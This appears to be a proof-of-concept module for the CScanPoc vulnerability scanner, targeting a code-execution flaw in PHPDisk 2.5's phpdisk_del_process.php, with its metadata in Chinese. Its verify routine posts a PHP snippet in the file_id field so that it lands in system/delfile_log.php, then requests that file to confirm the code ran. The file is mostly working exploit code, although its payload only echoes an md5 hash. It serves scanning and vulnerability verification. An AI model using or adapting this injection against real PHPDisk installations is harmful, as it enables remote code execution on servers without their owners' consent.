# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'PHPDisk_0001_p' # 平台漏洞编号，留空
    name = 'PHPDisk 2.5 /phpdisk_del_process.php 代码执行漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-07-18'  # 漏洞公布时间
    desc = '''
        利用环境比较鸡肋，代码执行需要关闭short_open_tag.
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=057665' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'PHPDisk'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a76a03e2-72ff-402c-8cf7-61d2d0938f8a'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            del_url = '{target}'.format(target=self.target)+'/phpdisk_del_process.php?a'
            shell_url = '{target}'.format(target=self.target)+'/system/delfile_log.php'
            data = {
                'pp': 'system/install.lock',
                'file_id': '<?php echo md5(233333);?>#',
                'safe': 'a'
            }
            post_data = urllib.urlencode(data)
            request = urllib2.Request(del_url, post_data)
            response = urllib2.urlopen(request)
            shell_request = urllib2.Request(shell_url)
            shell_response = urllib2.urlopen(shell_request)
            content = shell_response.read()
            match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()